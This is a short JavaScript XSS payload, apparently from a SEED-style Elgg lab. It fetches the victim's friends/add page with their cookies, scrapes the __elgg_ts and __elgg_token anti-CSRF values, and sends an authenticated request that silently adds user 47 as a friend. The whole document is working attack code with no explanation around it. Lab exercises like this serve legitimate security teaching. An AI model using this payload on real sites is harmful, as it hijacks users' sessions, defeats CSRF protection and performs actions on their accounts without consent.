(async () => {
    const url = 'http://www.xsslabelgg.com/action/friends/add';
    const body = await (await fetch(url, {
        credentials: 'include',
    })).text();
    fetch(`${url}?friend=47&${body.match(/__elgg_ts=\d*/g)[0]}&${body.match(/__elgg_token=[^"]*/g)[0]}`, {
        credentials: 'include',
    });
})();
